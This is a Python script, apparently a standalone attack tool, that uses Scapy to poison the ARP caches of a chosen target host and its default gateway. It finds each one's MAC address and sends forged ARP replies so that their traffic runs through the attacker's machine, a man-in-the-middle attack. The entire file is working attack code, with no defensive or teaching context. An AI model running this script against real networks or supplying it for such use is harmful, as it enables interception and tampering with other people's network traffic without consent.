from scapy.all import ARP, Ether, ICMP, IP, sendp, sniff, sr1, srp1
import argparse

def get_mac(ip):
	arp = Ether()/ARP(pdst=ip)
	resp = srp1(arp)

	return (resp[Ether].src)

def get_default_gateway_ip():
	p = sr1(IP(dst="www.google.com", ttl = 0)/ICMP()/"XXXXXXXXXXX")

	return (p.src)


def poison_arp_cache(target_ip, target_mac_addr, spoofed_ip):
	# Create the ARP response
	spoofed_resp = Ether()/ARP()

	# Set the destination MAC address
	spoofed_resp[Ether].dst = target_mac_addr
	spoofed_resp[ARP].hwdst = target_mac_addr

	# Set the destination IP address
	spoofed_resp[ARP].pdst = target_ip

	# Set the spoofed IP address
	spoofed_resp[ARP].psrc = spoofed_ip

	# is-at (response)
	spoofed_resp[ARP].op = 2

	#print(spoofed_resp[0].show())
	sendp(spoofed_resp)


def main():
	parser = argparse.ArgumentParser()

	parser.add_argument("-t", "--target", help="Target's IP address", action="store", required=True)

	args = parser.parse_args()
	print(f"Target IP: {args.target}")

	# Get default gateway's network details
	default_gateway_ip = get_default_gateway_ip()
	default_gateway_mac = get_mac(default_gateway_ip)

	# Get target's network details
	target_ip = args.target
	target_mac = get_mac(args.target)

	# Poison target's ARP cache table
	poison_arp_cache(target_ip, target_mac, default_gateway_ip)
	print(f"Sent ARP reply to {target_ip}")

	# Poison default gateway's ARP cache table
	poison_arp_cache(default_gateway_ip, default_gateway_mac, target_ip)
	print(f"Sent ARP reply to {default_gateway_ip}")


if __name__ == "__main__":
	main()